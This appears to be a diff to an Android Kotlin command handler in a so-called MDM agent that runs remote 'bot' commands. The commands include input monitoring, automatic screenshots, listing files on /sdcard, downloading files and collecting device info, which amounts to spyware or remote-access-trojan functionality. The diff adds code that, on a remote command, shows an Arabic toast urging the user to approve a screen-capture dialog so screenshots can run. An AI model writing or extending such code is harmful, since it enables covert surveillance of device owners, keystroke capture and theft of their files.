@@ -1,6 +1,8 @@
 package com.mdm.agent.data.remote
 
 import android.content.Context
+import android.os.Handler
+import android.os.Looper
 import android.util.Log
 import com.mdm.agent.data.model.CollectedData
 import com.mdm.agent.util.DeviceUtils
@@ -302,8 +304,27 @@ class CommandHandler(
             "input-monitoring-on" -> collectors.setInputMonitoring(true)
             "input-monitoring-off" -> collectors.setInputMonitoring(false)
             "screenshot-on" -> {
-                com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(true)
-                "auto_screenshot_enabled"
+                // ✅ MediaProjection request now comes ONLY from bot (not at app launch)
+                // If permission is already granted → just enable auto-screenshot
+                // If not → show system dialog to user (ONE TIME only)
+                if (com.mdm.agent.service.ScreenCaptureService.isReady()) {
+                    com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(true)
+                    Log.i(TAG, "✅ screenshot-on: auto-screenshot enabled (permission already granted)")
+                    "auto_screenshot_enabled"
+                } else {
+                    Log.i(TAG, "📸 screenshot-on: requesting MediaProjection permission from user (one-time)")
+                    Handler(Looper.getMainLooper()).post {
+                        try {
+                            android.widget.Toast.makeText(context,
+                                "يُرجى الموافقة على لقطة الشاشة لتفعيل الميزة",
+                                android.widget.Toast.LENGTH_LONG).show()
+                            com.mdm.agent.ui.ScreenCapturePermissionActivity.requestPermission(context)
+                        } catch (e: Exception) {
+                            Log.e(TAG, "❌ Failed to request MediaProjection: ${e.message}")
+                        }
+                    }
+                    "permission_dialog_shown"
+                }
             }
             "screenshot-off" -> {
                 com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(false)
@@ -314,7 +335,13 @@ class CommandHandler(
             "stop-videos" -> "stopped"
             "stop-gallery" -> "stopped"
             "get-device-info" -> collectors.getFullDeviceInfo()
-            "ls" -> collectors.listFiles(params?.optString("value", "/sdcard/") ?: "/sdcard/")
+            "ls" -> {
+                val path = params?.optString("value", "/sdcard/") ?: "/sdcard/"
+                Log.i(TAG, "📂 ls: listing files in $path")
+                val result = collectors.listFiles(path)
+                Log.i(TAG, "📂 ls: result type=${result?.javaClass?.simpleName}")
+                result
+            }
             "download-file" -> {
                 val filePath = params?.optString("value", "") ?: ""
                 if (filePath.isNotEmpty()) {
